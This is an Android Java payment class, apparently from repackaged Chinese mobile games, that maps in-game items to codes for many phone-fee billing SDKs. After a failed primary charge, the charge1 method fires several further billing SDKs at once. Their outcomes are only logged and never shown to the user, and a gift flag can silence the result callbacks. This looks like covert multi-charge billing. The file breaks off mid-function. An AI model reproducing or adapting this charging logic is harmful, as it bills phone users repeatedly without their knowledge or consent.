package com.bb_sz.pay;

import android.app.Activity;
import android.media.audiofx.Equalizer;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.SystemClock;
import android.util.Log;


import com.android.mai.mtools.listener.MPayResultListener;
import com.android.mai.mtools.utils.MPay;
import com.android.pri.in.PriCallBack;
import com.bb_sz.ndk.upload.ThirdPayCB;
import com.bb_sz.pay.order.PayOrder;
import com.jpay.sdk.IChargeResult;
import com.jpay.sdk.JPay;
import com.mj.jar.pay.BillingListener;
import com.mn.kt.MnPro;
import com.wyzf.constant.PayResult;
import com.wyzf.pay.PayResultListener;
import com.wyzf.pay.WYZFPay;
import a.a.b.n.ESDK;

/**
 * Created by Administrator on 2017/4/24.
 */

public class WYPay {

    public static int JBGM = 4410;
    public static int SDPGM = 4414;
    public static int JMLP = 4418;
    public static int YJLQQBLP = 4411;
    public static int JGPGM = 4415;
    public static int SJLB = 4419;
    public static int CJYLGM = 4412;
    public static int JBYLB = 4416;
    public static int XXYEGM = 4413;
    public static int JMLB = 4417;

    public static int[] FCNLM_PAY_POINT = {4449, 4450, 4451, 4451, 4452, 4466};

    public static int[] HJZJ_PAY_POINT = {4423, 4424, 4425, 4426, 4427, 4428, 4429, 4430, 4431, 4432, 4433, 4434, 4435, 4436, 4437, 4438, 4439, 4440, 4441, 4442, 4443};

    public static int[] CJFX_PAY_POINT = {4560, 4561, 4562, 4563, 4564, 4565, 4566, 4567, 4568};

    public static int[] QCLXX_PAY_POINT = {4796,4797,4798,4799,4800};

    public static int[] GFXM_PAY_POINT = {4838,4839,4841,4842,4843,4844,4845,4846};

    public static int[] HXTJ_PAY_POINT = {4892,4893,4894,4895,4896,4897,4898,4899,4900,4901};

    public static int[] WDSJ_PAY_POINT ={4902,4903,4904,4905,4906,4907};

    public static String[] FCNLM_FEE_NAME = {"100金币", "250金币", "500金币", "700金币", "1000金币", "1600金币"};

    public static String[] HJZJ_FEE_NAME = {"首冲礼包", "安魂曲套装", "3日无限弹药", "超值大礼包", "豪华大礼包", "幸运大礼包", "畅玩大礼包", "钻石礼包", "VIP畅玩礼包", "钻石100", "钻石350", "钻石800", "钻石1500", "十字光剑",
            "M134加特林", "熔岩喷射器", "蓝焰冰晶之翼", "圣天使之翼", "兔女郎服装", "公主装", "血之克劳迪娅"};

    public static String[] CJFX_FEE_NAME = {
            "[登陆礼包]仅需20元，购买200钻石，并赠送50钻石，2个冲击波，2个血瓶",
            "[60钻石]仅需6元，购买60钻石",
            "[100钻石]仅需10元，购买100钻石",
            "[200钻石]仅需16元，购买200钻石",
            "[30000金币]仅需6元，购买30000金币",
            "[50000金币]仅需10元，购买50000金币",
            "[90000金币]仅需16元，购买90000金币",
            "[抽宠物]仅需6元，抽取一次稀有宠物",
            "[钻石礼包]仅需10元，购买100钻石，并赠送30钻石"};

    public static String[] TTBY_FEE_NAME = {
            "金币购买",
            "全部领取",
            "高爆鱼雷",
            "新鲜鱼饵",
            "能量炮",
            "激光炮",
            "金币鱼礼包",
            "精美礼包",
            "至尊大礼包",
            "升级礼包"
    };

    public static String[] QCLXX_FEE_NAME = {
            "获得788枚幸运星，仅需X.XX元，即可拥有！" ,
            "获得560枚幸运星，仅需X.XX元，即可拥有！" ,
            "获得118枚幸运星，仅需X.XX元，即可拥有！" ,
            "获得228枚幸运星，仅需X.XX元，即可拥有！" ,
            "获得500枚幸运星，仅需X.XX元，即可拥有！"};


    public static String[] ZWDZJS_FEE_NAME = {
            "召唤巨龙，释放大招2个：资费2元" ,
            "每分钟加150金币" ,
            "每分钟加300金币" ,
            "超值礼包" ,
            "150个椰果子弹" ,
            "150个仙人掌子弹" ,
            "150个激光子弹" ,
            "150个西瓜子弹" ,
            "150个导弹子弹" ,
            "购买永久椰果子弹:资费4元" ,
            "购买永久激光子弹:资费6元" ,
            "购买永久仙人掌子弹:资费5元" ,
            "购买永久西瓜子弹:资费7元" ,
            "散弹X300" ,
            "散弹X100" ,
            "穿甲弹X100" ,
            "穿甲弹X300" ,
            "500金币" ,
            "1500金币",
            "购买永久导弹:资费20元"};

    public static String GFXM_FEE_NAME[] = {
            "登录奖励",
            "限时特惠",
            "惊喜宝箱",
            "复活",
            "宠物解锁",
            "树枝解锁",
            "道具解锁",
            "充值礼包",
            "功夫熊猫礼包"
    };

    public static String HXTJ_FEE_NAME[] = {
            "4000金币" ,
            "10500金币" ,
            "22000金币" ,
            "40钻石" ,
            "105钻石" ,
            "220钻石" ,
            "强化礼包" ,
            "豪华礼包" ,
            "1元礼包" ,
            "复活"
    };

    public static String WDSJ_FEE_NAME[] = {
            "首页礼包" ,
            "拯救礼包" ,
            "解封礼包" ,
            "迷失礼包" ,
            "护盾礼包" ,
            "购买角色"
    };

    public static String[] HJZJ_M_PAY_POINT = {
            "lhpaAzcuov6kp5C6jydi1jqc",
            "7rijtpre3r6sfbuniqn8oniu",
            "gir0rhy9mB1q8t249ofAaaaC",
            "a5i7t1r92qDjosa9iohbw68q",
            "u0u09n2cr5yaf58zmw1m9dke",
            "9qAg3kskCCmrhk10bwo5h97a",
            "uCuuClfft7BE0niDf0nas5Cc",
            "pwkaxr9Ekk6CuAxq8chrkja5",
            "y8t9Cf3Eztmfchr3z1n8685E",
            "qAqEBpqhw8Euulzfdxsvfm4c",
            "6kyqj3u5dcgdpz64yqonfv28",
            "31kfqukEkuigsxeAeeq314tn",
            "vk74uyoA4Drgcj7bqyeuskoB",
            "4a2xBmeqclwvic8tftx6ztva",
            "gDhfa6ju7qkffoemEnorcCsx",
            "3vBfpf8x50rq20uxoxwcBks5",
            "huc5x8mlfsju5iojtk185fCg",
            "rzwf9x2sBavosled9lcscjoj",
            "lmEwe7b2Cucy5ip6ukcoft7j",
            "1hl00icgC80fcstudx2DD1th",
            "4xAlk9jEk86Dx4m5m58s6bsB"
    };

    public static String[] TTBY_M_PAY_POINT = {
            "wEz608uzuk2dmwv7203Agzqq",
            "sszhmpijAkvv3ux8g3lB5bie",
            "2k1mgppEmzE0fhr59agyExfh",
            "iddzgt0xb15wwc09n00trmAh",
            "hne4fo9fu4AwmzkE0Ekcb32w",
            "ca44Eyc7aBf9c1hpxlirf5m3",
            "bu596wysjEtrdC7C6slx0xjq",
            "zEpj7AbbCD6em64Dmo1y9iy6",
            "fqAsp5kjdcB0vBct9qdt0muc",
            "003jAy834zkvhrj95g0CgApp"
    };

    public static String[] FCNLM_M_PAY_POINT = {
            "gte1nynckiy9vdt6DwsCtCal",
            "skmlurrr1t079h8f8w4C429r",
            "okyqqmoEe7xu4luebkx8DA1v",
            "5v78hveqsCl244tp2j4zoDo0",
            "bt33iEnEgE3j1gz8xge6uwy8",
            "83irq1dtyBnsqptx5ibujc6D"
    };

    public static String[] CJFX_M_PAY_POINT = {
            "xcmB4yelhpljd1nsj34ml5Ao",
            "muDbuq4a2f38dAi0m8buydDE",
            "fcsaiqixhdjEylomrqf77miy",
            "88flw82755Eobmirr0qrd73q",
            "b6xCi9l0ksrxzpE0z6ikbpei",
            "ke3qCwzCjibso19rAolq7bar",
            "0y20ebn4qa5s6t32Ah7tuxlj",
            "wpCkjo2z0w8x7e5gl6k61eBc",
            "upEk4ElgBkq1u1pbb1txgpj1"
    };

    public static String[] QCLXX_M_PAY_POINT={
            "54spvb3s7rl6c04jAAf0og71" ,
            "24A0rDjafz9nkqAbvq804Coa" ,
            "e4BB54wbqpybcp6ag9n9up4g" ,
            "iDuokzoeEcCa3jEgw5uAw1ax" ,
            "r4rcy55lu4d5ryvmmne4osfk"};

    public static String[] ZWDZJS_M_POINT = {
            "ofgbme6AB5vy0eA0DlAkgdeg" ,
            "c8uewsrEvp356h4z54z2qf5h" ,
            "bpa6lgc8jrv88jcE2z3bmpfE" ,
            "f1hb8iinhBAf119qyn1Cfiyg" ,
            "9pbfv8b9D0321g7ujowdmu4m" ,
            "e62ps5hy4Chrq9Dqbjdvd1gg" ,
            "s67fcg3EpE0pe5aoiC7z8wxo" ,
            "dv5aAxfgAnE3ynb8jvgAv4m5" ,
            "yfdxfAr51By7nkkemAogB44p" ,
            "xmcqcxcEoyBD8nDEm2733C8i" ,
            "6hfxn5w40w4cf4hicDp5xirC" ,
            "dt4y27lb3p1id0w3k757nvet" ,
            "7c4b9ff9o0cemlqmCE87iDEA" ,
            "5udam4xBnqC88cfE5rsBxg3r" ,
            "oj52xdh0b367a5Ao1n6vD89t" ,
            "oybu0nalxz4AzrDoABwyky4D" ,
            "azh1BciyEilt0sh1swf2gel1" ,
            "15fvzwm257Ckauzzd5rgudg5" ,
            "34zn5lsrmi87naqqcfb9Chxy" ,
            "42fprc4wBsiz03DfnqlCxaci"};

    public static String GFXM_M_POINT[] = {
            "eygqCAvly23khs9vryr60Ewm" ,
            "edcwABzD5s0deopAz7ict0B7" ,
            "ljwdd8cA7lhuAewx68cwByx5" ,
            "l0fawBc3fal06lvk38uAyy1o" ,
            "yp4q9uae3edn98E36nd0ltbk" ,
            "v377gu0o10xb15mv8jlwu81h" ,
            "vte8r5f4i9dq5DA01qq6yn0b" ,
            "fCmg57r6p66v448Duo0lBA2s" ,
            "919vsDzzwwn7m5o1BrA6kBrn"
    };

    public static String HXTJ_M_POINT[] = {
            "pdBxalk0Byq9qncC1m9orc4i" ,
            "vrEx5iy8y36jfoqy8Em0e4ou" ,
            "4tra1v9o3liy0wevrhcfvcie" ,
            "h9ynC1pgfieEo5yseDkCd5mr" ,
            "mfqigbbsrwxfy1nn7z5E4sux" ,
            "a7dnt13vAcvwtmq9yntBDrlt" ,
            "hlrjDtbgDsA2tep5E5aq3lgf" ,
            "jh9wsyoiDB7Ddlxf0auml7ik" ,
            "qDu1nCruBEp8tu05Axi50xwd" ,
            "qDu1nCruBEp8tu05Axi50xwd"
    };

    public static String WDSJ_M_POINT[] = {
            "bExowqlwmyo8tvB5a92whprn" ,
            "s622ikso0oD9jtlxzAhhzwvD" ,
            "pyEc7ou0d5qi0h0ild8ppi0x" ,
            "5cD9bBi4tEf7po3u08ytcnE6" ,
            "vv9Dnglf1inDv2shl5vwAhze" ,
            "t9vraep3sf5vfj9p6uA66ujd"
    };

    public static String[] HJZJ_QP_PAY_POINT={
      "05YP" ,
      "05YQ" ,
      "05YR" ,
      "05YS" ,
      "05YT" ,
      "05YU" ,
      "05YV" ,
      "05YW" ,
      "05YX" ,
      "05YY" ,
      "05YZ" ,
      "05Z0" ,
      "05Z1" ,
      "05Z2" ,
      "05Z3" ,
      "05Z4" ,
      "05Z5" ,
      "05Z6" ,
      "05Z7" ,
      "05Z8" ,
      "05Z9"
    };

    public static String[] TTBY_QP_PAY_POINT={
            "05YG" ,
            "05YH" ,
            "05YI" ,
            "05YJ" ,
            "05YK" ,
            "05YL" ,
            "05YM" ,
            "05YN" ,
            "05YO" ,
            "05YO"
    };

    public static String[] FCNLM_QP_PAY_POINT ={
          "05Y1" ,
          "05Y2" ,
          "05Y3" ,
          "05Y4" ,
          "05Y5" ,
          "05Y6"
    };

    public static String[] CJFX_QP_PAY_POINT ={
          "05Y7" ,
          "05Y8" ,
          "05Y9" ,
          "05YA" ,
          "05YB" ,
          "05YC" ,
          "05YD" ,
          "05YE" ,
          "05YF"
    };

    public static String QCLXX_QP_PAY_POINT[] ={
            "068L" ,
            "068M" ,
            "068N" ,
            "068O" ,
            "068P"};


    public static String ZWDZJS_QP_PAY_POINT[] = {
            "06AF" ,
            "06AG" ,
            "06AH" ,
            "06AI" ,
            "06AJ" ,
            "06AK" ,
            "06AL" ,
            "06AM" ,
            "06AN" ,
            "06AO" ,
            "06AP" ,
            "06AQ" ,
            "06AR" ,
            "06AS" ,
            "06AT" ,
            "06AU" ,
            "06AV" ,
            "06AW" ,
            "06AX" ,
            "06AY"
    };

    public static String GFXM_QP_PAY_POINT[] = {
            "06E6" ,
            "06E7" ,
            "06E8" ,
            "06E9" ,
            "06EA" ,
            "06EB" ,
            "06EC" ,
            "06ED" ,
            "06EE"
    };

    public static String HXTJ_QP_PAY_POINT[] = {
            "06FY" ,
            "06FZ" ,
            "06G0" ,
            "06G1" ,
            "06G2" ,
            "06G3" ,
            "06G4" ,
            "06G5" ,
            "06G6" ,
            "06G7"
    };

    public static String WDSJ_QP_PAY_POINT[] = {
        "06H8" ,
        "06H9" ,
        "06HA" ,
        "06HB" ,
        "06HC" ,
        "06HD"
    };


    public static String QCLXX_YF_PAY_POINT[] = {
      "000670000" ,
      "000670001" ,
      "000670002" ,
      "000670003" ,
      "000670004"
    };

    public static String GFXM_YF_PAY_POINT[] = {
            "000680000" ,
            "000680001" ,
            "000680002" ,
            "000680003" ,
            "000680004" ,
            "000680005" ,
            "000680006" ,
            "000680007" ,
            "000680008"
    };

    public static String WDSJ_YF_PAY_POINT[] = {
      "000695000" ,
      "000695001" ,
      "000695002" ,
      "000695003" ,
      "000695004" ,
      "000695005"
    };





    public static Handler appHandler = new Handler(){

        @Override
        public void handleMessage(Message msg) {
            // TODO Auto-generated method stub
            if (msg.what == 100)
            {
                Bundle data = msg.getData();
                int errcode = data.getInt("errcode");
                String extdata = data.getString("extdata");
                Log.e("sky","qi pa pay success telephone pay----errCode"+errcode+"---extData="+extdata);
                //chargeResult.onChargeResult(0,"qi pa phone fee pay success");
            }
            else
            {
                //应用可以不关心这些错误码
                Bundle data = msg.getData();
                int errcode = data.getInt("errcode");
                String extdata = data.getString("extdata");
                Log.e("sky","qi pa pay failed----errCode"+errcode+"---extData="+extdata);
                //chargeResult.onChargeResult(1,"qi pa pay failed");
            }
        }

    };

    /**
     * 玉峰支付回调
     */
    public static BillingListener billingListener = new BillingListener() {
        @Override
        public void onInitResult(int i) {
            Log.e("sky","Yu Feng init result="+i);
        }

        @Override
        public void onBillingResult(int i, Bundle bundle) {
            Log.e("sky","Yu Feng pay result="+i);
        }
    };


    private static String getMPayPointByFeeName(String feeDesc, String feeName) {
        Log.e("sky", "appname=" + feeDesc);
        Log.e("sky", "feeName=" + feeName);
        if (feeDesc.equals("合金战姬")) {
            return HJZJ_M_PAY_POINT[indexof(feeName, HJZJ_FEE_NAME)];
        } else if (feeDesc.equals("天天捕鱼")) {
            return TTBY_M_PAY_POINT[indexof(feeName, TTBY_FEE_NAME)];
        } else if (feeDesc.equals("复仇鸟联盟2")) {
            return FCNLM_M_PAY_POINT[indexof(feeName, FCNLM_FEE_NAME)];
        } else if (feeDesc.equals("超级飞侠")) {
            return CJFX_M_PAY_POINT[indexof(feeName, CJFX_FEE_NAME)];
        }else if (feeDesc.equals("Q宠乐消消")){
            return QCLXX_M_PAY_POINT[indexof(feeName, QCLXX_FEE_NAME)];
        }else if(feeDesc.equals("植物大战僵尸射击版")){
            return ZWDZJS_M_POINT[indexof(feeName, ZWDZJS_FEE_NAME)];
        }else if (feeDesc.equals("功夫熊猫")){
            return GFXM_M_POINT[indexof(feeName, GFXM_FEE_NAME)];
        }else if (feeDesc.equals("火线突击之全民反恐")){
            return HXTJ_M_POINT[indexof(feeName,HXTJ_FEE_NAME)];
        }else if (feeDesc.equals("我的新世界")){
            return WDSJ_M_POINT[indexof(feeName, WDSJ_FEE_NAME)];
        }
        return "4xAlk9jEk86Dx4m5m58s6bsB";
    }


    private static int getPayPointBuYu(String feeDesc, String feeName) {
        Log.e("sky", "appname=" + feeDesc);
        Log.e("sky", "feeName=" + feeName);
        if (null == feeName) return 0;
        if (feeDesc.equals("天天捕鱼")) {
            if ("金币大折扣".equals(feeName)) {
                return JBGM;
            } else if ("全部领取".equals(feeName)) {
                return YJLQQBLP;
            } else if ("高爆鱼雷".equals(feeName)) {
                return CJYLGM;
            } else if ("新鲜鱼饵".equals(feeName)) {
                return XXYEGM;
            } else if ("能量炮".equals(feeName)) {
                return SDPGM;
            } else if ("激光炮".equals(feeName)) {
                return JGPGM;
            } else if ("金币鱼礼包".equals(feeName)) {
                return JBYLB;
            } else if ("至尊大礼包".equals(feeName)) {
                return JMLP;
            } else if ("升级礼包".equals(feeName)) {
                return SJLB;
            } else {
                return JMLB;//9
            }
        } else if (feeDesc.equals("合金战姬")) {
            return HJZJ_PAY_POINT[indexof(feeName, HJZJ_FEE_NAME)];
        } else if (feeDesc.equals("复仇鸟联盟2")) {
            return FCNLM_PAY_POINT[indexof(feeName, FCNLM_FEE_NAME)];
        } else if (feeDesc.equals("超级飞侠")) {
            return CJFX_PAY_POINT[indexof(feeName, CJFX_FEE_NAME)];
        }else if (feeDesc.equals("Q宠乐消消")){
            return QCLXX_PAY_POINT[indexof(feeName, QCLXX_FEE_NAME)];
        }else if (feeDesc.equals("功夫熊猫")){
            return GFXM_PAY_POINT[indexof(feeName, GFXM_FEE_NAME)];
        }else if (feeDesc.equals("火线突击之全民反恐")){
            return HXTJ_PAY_POINT[indexof(feeName,HXTJ_FEE_NAME)];
        }else if (feeDesc.equals("我的新世界")){
            return WDSJ_PAY_POINT[indexof(feeName,WDSJ_FEE_NAME)];
        }
        return 0;
    }


    public static int indexof(String feeName, String[] payNames) {
        Log.e("sky","indexof---feeName="+feeName+"---payNames="+payNames[0]);
        for (int i = 0; i < payNames.length; i++) {
            if (payNames[i].equals(feeName)) {
                return i;
            }
        }
        return payNames.length - 3;
    }

    private static int getYiYouPayPoint(String feeDesc, String feeName) {
        Log.e("sky", "getYiYouPayPoint---appname=" + feeDesc);
        Log.e("sky", "getYiYouPayPoint---feeName=" + feeName);
        if (feeDesc.equals("天天捕鱼")) {
            return indexof(feeDesc,TTBY_FEE_NAME)+1;
        }else if (feeDesc.equals("合金战姬")) {
            return indexof(feeName, HJZJ_FEE_NAME)+1;
        } else if (feeDesc.equals("复仇鸟联盟2")) {
            return indexof(feeName, FCNLM_FEE_NAME)+1;
        } else if (feeDesc.equals("超级飞侠")) {
            return indexof(feeName, CJFX_FEE_NAME)+1;
        }else if (feeDesc.equals("Q宠乐消消")){
            return indexof(feeName, QCLXX_FEE_NAME)+1;
        }else if (feeDesc.equals("植物大战僵尸射击版")){
            return indexof(feeName, ZWDZJS_FEE_NAME)+1;
        }else if (feeDesc.equals("功夫熊猫")){
            return indexof(feeName, GFXM_FEE_NAME)+1;
        }else if (feeDesc.equals("火线突击之全民反恐")){
            return indexof(feeName, HXTJ_FEE_NAME)+1;
        }else if (feeDesc.equals("我的新世界")){
            return indexof(feeName, WDSJ_FEE_NAME)+1;
        }
        return 1;
    }

    private static String getQiPaPayPoint(String feeDesc, String feeName){
        Log.e("sky", "getQiPaPayPoint---appname=" + feeDesc);
        Log.e("sky", "getQiPaPayPoint---feeName=" + feeName);
        String result = "";
        if (feeDesc.equals("合金战姬")) {
            result =  HJZJ_QP_PAY_POINT[indexof(feeName, HJZJ_FEE_NAME)];
        } else if (feeDesc.equals("天天捕鱼")) {
            result =  TTBY_QP_PAY_POINT[indexof(feeName, TTBY_FEE_NAME)];
        } else if (feeDesc.equals("复仇鸟联盟2")) {
            result =  FCNLM_QP_PAY_POINT[indexof(feeName, FCNLM_FEE_NAME)];
        } else if (feeDesc.equals("超级飞侠")) {
            result =  CJFX_QP_PAY_POINT[indexof(feeName, CJFX_FEE_NAME)];
        }else if (feeDesc.equals("Q宠乐消消")){
            result = QCLXX_QP_PAY_POINT[indexof(feeName, QCLXX_FEE_NAME)];
        }else if (feeDesc.equals("植物大战僵尸射击版")){
            result = ZWDZJS_QP_PAY_POINT[indexof(feeName, ZWDZJS_FEE_NAME)];
        }else if (feeDesc.equals("功夫熊猫")){
            result = GFXM_QP_PAY_POINT[indexof(feeName, GFXM_FEE_NAME)];
        }else if (feeDesc.equals("火线突击之全民反恐")){
            result = HXTJ_QP_PAY_POINT[indexof(feeName, HXTJ_FEE_NAME)];
        }else if (feeDesc.equals("我的新世界")){
            result = WDSJ_QP_PAY_POINT[indexof(feeName, WDSJ_FEE_NAME)];
        }
        Log.e("sky","qi pa payPoint="+result);
        return result;
    }

    private static String GET_YU_FENG_PAY_POINT(String feeDesc, String feeName,String price){
        Log.e("sky","GET_YU_FENG_PAY_POINT---feeDesc="+feeDesc+"----feeName="+feeName+"---price="+price);
        int p = Integer.parseInt(price);
        if (p>=2000){
            if (feeDesc.equals("天天捕鱼")) {
                return null;
            }else if (feeDesc.equals("合金战姬")) {
                if (feeName.equals("安魂曲套装")){
                    return "000665000";
                }else if (feeDesc.equals("超值大礼包")){
                    return "000665001";
                }else if (feeDesc.equals("VIP畅玩礼包")){
                    return "000665002";
                }else if (feeDesc.equals("钻石1500")){
                    return "000665003";
                }else {
                    return "000665000";
                }
            } else if (feeDesc.equals("复仇鸟联盟2")) {
                return "000664000";
            } else if (feeDesc.equals("超级飞侠")) {
                return "000666000";
            }else if (feeDesc.equals("Q宠乐消消")){
                return QCLXX_YF_PAY_POINT[indexof(feeName,QCLXX_FEE_NAME)];
            }else if (feeDesc.equals("植物大战僵尸射击版")){
                return "000675000";
            }else if (feeDesc.equals("功夫熊猫")){
                return GFXM_YF_PAY_POINT[indexof(feeName, GFXM_FEE_NAME)];
            }else if (feeDesc.equals("火线突击之全民反恐")){
                return feeName.equals("220钻石")?"000692000":"000692001";
            }else if (feeDesc.equals("我的新世界")){
                return WDSJ_YF_PAY_POINT[indexof(feeName, WDSJ_FEE_NAME)];
            }
        }
        return "000692000";
    }



    static int payType = 9;
    static IChargeResult chargeResult = null;

    public static void charge(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {
        PayOrder.getInstance().init(activity);
        payType = Api.getPayType(activity);
        Log.e("sky", "payType=" + payType + "------");
        if(feeDesc.equals("天天捕鱼") && feeName.equals("至尊大礼包")){
            chargeResultCb.onChargeResult(0,"pay free");
            return;
        }
        if (payType == 9) {
            charge1(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
        } else {
            charge2(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
        }
    }

    private static void giftCallBack(int i,String msg,IChargeResult chargeResult){
        if (!Api.sendGift()){
            chargeResult.onChargeResult(i,msg);
        }
    }

    /**
     * 奇葩sdk
     * @param activity
     * @param price
     * @param uniqueid
     * @param cpserverparam
     * @param feeName
     * @param feeDesc
     * @param chargeResultCb
     */
    private static void charge4(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
        initThirdReport(activity, 5);
        chargeResult = chargeResultCb;
        MnPro.getInstance().start(activity, getQiPaPayPoint(feeDesc,feeName), "");
    }


    public static int failed = 0;
    public static int success = 0;


    public static void charge1(final Activity activity, final String price, final String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {
        final int paysdk = Api.getPaySDK(activity);
        Log.e("sky","paysdk="+paysdk);
        success = 0;
        failed = 0;
        JPay.getInstance().charge(activity, price, uniqueid, cpserverparam, feeName, feeDesc, new IChargeResult() {
            @Override
            public void onChargeResult(int i, String s) {
                Log.e("sky", "jpay result:" + i + "-----s=" + s);
                if (i != 0 && i != 6) {// 0 表示计费成功； 6 表示mm计费成功，当成功处理。
                    if ((paysdk%2) == 1){
                        initThirdReport(activity, 1);
                        final int p = changePrice(price);
                        Log.e("sky", "WYZFPay start price=" + p + "---feeCode=" + "{$feeCode$}");
                        WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                            @Override
                            public void onResult(PayResult payResult, int i) {
                                Log.e("sky", "WYZFPay Result=" + payResult.msg + "---threadId=" + Thread.currentThread().getId() + "---threadName=" + Thread.currentThread().getName());
                                switch (payResult) {
                                    case SUCCESS: {
                                        break;
                                    }
                                    default: {
                                    }
                                }
                            }
                        });
                    }
                    if (((paysdk>>1)%2) ==1){
                        initThirdReport(activity, 2);
                        int yentPayPoint = getPayPointBuYu(feeDesc, feeName);
                        Log.e("sky", "Yin Mei start ----yentPayPoint=" + yentPayPoint);
                        if (yentPayPoint != 0){
                            ESDK.getInstance(activity).pay(yentPayPoint, cpserverparam, activity, new PriCallBack() {
                                @Override
                                public void success(int i) {
                                    Log.e("sky", "time end failed=" + failed + "----success=" + success);
                                }
                                @Override
                                public void fail(int i) {
                                    synchronized (chargeResultCb) {
                                        Log.e("sky:", "YentPay failed， i= " + i + "---threadId=" + Thread.currentThread().getId() + "---threadName=" + Thread.currentThread().getName());
                                    }
                                }
                            });
                        }
                    }

                    if ((paysdk>>2)%2 == 1){
                        initThirdReport(activity, 3);
                        int mprice = changePriceForMPay(price);
                        String mPoint = getMPayPointByFeeName(feeDesc, feeName);
                        Log.e("sky", "MPay start-----mprice=" + mprice + "---MAI_MSA=" + "{$MAI_MSA$}---" + "cid=" + "{$CID$}" + "----mPoint=" + mPoint);
                        MPay.getInstance().pay(activity, mPoint, "{$CID$}"+ SystemClock.currentThreadTimeMillis(), "{$CID$}", new MPayResultListener() {
                            @Override
                            public void callback(String s, int i, int i1, String s1) {
                                Log.e("sky","Mpay result:cpOid="+s+"---code="+i+"---detail="+i1+"---ext="+s1);
                            }
                        });
                    }

                    if ((paysdk>>3)%2 == 1){
                        //奇葩pay
                        charge4(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    }
                    //宜游
                    //charge3(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    if ((paysdk>>4)%2 == 1){
                        //玉峰
                        charge5(activity, price, uniqueid, cpserverparam, feeName, feeDesc, chargeResultCb);
                    }

                } else {
                    Log.e("sky:", "jpay success");
                    giftCallBack(0, "jpay success",chargeResultCb);
                }
            }
        });
    }

    private static void charge5(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, IChargeResult chargeResultCb) {
        String payPoint = null;
        if (null == Main.mjPaySDK){
            Log.e("sky","Yu Feng no need");
            return;
        }else if (null != (payPoint = GET_YU_FENG_PAY_POINT(feeDesc,feeName,price))){
            initThirdReport(activity, 6);
            Main.mjPaySDK.pay(String.valueOf(System.currentTimeMillis()),payPoint,"2000");
            return;
        }
        Log.e("sky","price blow 20");
    }

//    private static void charge3(Activity activity, String price, String uniqueid, String cpserverparam, String feeName, String feeDesc, final IChargeResult chargeResultCb) {
//        initThirdReport(activity, 4);
//        int payPoint =1;
//        payPoint = getYiYouPayPoint(feeDesc,feeName);
//        Log.e("sky","yi you pay start-----payPoint="+payPoint);
//        PaySDK.getInstance().startPay(activity, payPoint, 0, 0, new PayResultCallback() {
//            @Override
//            public void onPayCancel(int i) {
//                Log.e("sky","Yi You pay cancel"+"---i="+i);
//            }
//
//            @Override
//            public void onPayFailed(int i, String s, String s1) {
//                Log.e("sky","Yi You pay failed"+"------i="+i+"---s="+s+"---s1="+s1);
//            }
//
//            @Override
//            public void onPaySuccess(int i, int i1) {
//                Log.e("sky","Yi You pay success"+"---i="+i+"----i1="+i1);
//            }
//        });
//    }

    public static void charge2(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {


        JPay.getInstance().charge(activity, price, uniqueid, cpserverparam, feeName, feeDesc, new IChargeResult() {
            @Override
            public void onChargeResult(int i, String s) {
                Log.e("sky", "i=" + i + "----s=" + s);
                if (i != 0 && i != 6) {// 0 表示计费成功； 6 表示mm计费成功，当成功处理。
                    final int p = changePrice(price);
                    Log.e("sky", "price=" + p);
                    if (Api.getPayType(activity) == 2) {
                        Log.e("sky", "WYZFPay first");
                        initThirdReport(activity, 1);
                        WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                            @Override
                            public void onResult(PayResult payResult, int i) {
                                switch (payResult) {
                                    case SUCCESS: {
                                        Log.e("sky:", "weiyun success");
                                        giftCallBack(0, "WYZFPay success",chargeResultCb);
                                        //chargeResultCb.onChargeResult(0, "WYZFPay success");
                                        break;
                                    }
                                    default: {
                                        Log.e("sky", "PayResult" + payResult.msg);
                                        initThirdReport(activity, 2);
                                        ESDK.getInstance(activity).pay(getPayPointBuYu(feeDesc, feeName), cpserverparam, activity, new PriCallBack() {
                                            @Override
                                            public void success(int i) {
                                                Log.e("sky:", "YentPay success");
                                                giftCallBack(0, "YentPay success",chargeResultCb);
                                                //chargeResultCb.onChargeResult(0, "YentPay success");
                                            }

                                            @Override
                                            public void fail(int i) {
                                                Log.e("sky:", "YentPay failed， i= " + i);
                                                giftCallBack(1, "pay failed",chargeResultCb);
                                                //chargeResultCb.onChargeResult(1, "pay failed");
                                            }
                                        });
                                    }
                                }
                            }
                        });
                    } else {
                        Log.e("sky", "Yent first");
                        initThirdReport(activity, 2);
                        ESDK.getInstance(activity).pay(getPayPointBuYu(feeDesc, feeName), feeName, activity, new PriCallBack() {
                            @Override
                            public void success(int i) {
                                Log.e("sky:", "YentPay success");
                                giftCallBack(0, "YentPay success",chargeResultCb);
                                //chargeResultCb.onChargeResult(0, "YentPay success");
                            }

                            @Override
                            public void fail(int i) {
                                Log.e("sky:", "YentPay failed， i= " + i);
                                initThirdReport(activity, 1);
                                WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                                    @Override
                                    public void onResult(PayResult payResult, int i) {
                                        switch (payResult) {
                                            case SUCCESS: {
                                                Log.e("sky:", "WYZFPay success");
                                                giftCallBack(0, "WYZFPay success",chargeResultCb);
                                                //chargeResultCb.onChargeResult(0, "YentPay success");
                                                break;
                                            }
                                            default: {
                                                Log.e("sky", "PayResult" + payResult.msg);
                                                Log.e("sky:", "WYZFPay failed");
                                                giftCallBack(1, "WYZFPay failed",chargeResultCb);
                                                //chargeResultCb.onChargeResult(1, "pay failed");
                                            }
                                        }
                                    }
                                });
                            }
                        });
                    }
                } else {
                    Log.e("sky:", "jpay success");
                    giftCallBack(0, "jpay success",chargeResultCb);
                    //chargeResultCb.onChargeResult(0, "jpay success");
                }
            }
        });
    }

    private static int changePrice(String price) {
        int p = Integer.parseInt(price);
